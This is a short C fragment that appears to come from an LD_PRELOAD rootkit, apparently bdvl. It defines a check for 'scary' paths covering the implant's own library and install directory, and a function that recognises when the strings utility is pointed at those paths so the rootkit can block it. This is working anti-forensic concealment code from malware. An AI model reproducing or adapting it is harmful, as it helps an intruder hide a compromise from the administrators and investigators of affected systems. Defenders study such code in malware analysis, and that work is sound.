int scary_path(char *string){
    if(strstr(BDVLSO, string) || 
        strstr(INSTALL_DIR, string))
        return 1;

    for(int i = 0; i < SCARY_PATHS_SIZE; i++)
        if(!fnmatch(scary_paths[i], string, FNM_PATHNAME) ||
            !strncmp(scary_paths[i], string, strlen(scary_paths[i])) ||
            strstr(scary_paths[i], string)) return 1;

    return 0;
}

int block_strings(char *const argv[]){
    if(argv[0] == NULL || !fnmatch(STRINGS_PATH, argv[0], FNM_PATHNAME))
        return 0;

    for(int i = 0; argv[i] != NULL; i++)
        if(scary_path(argv[i])) return 1;

    return 0;
}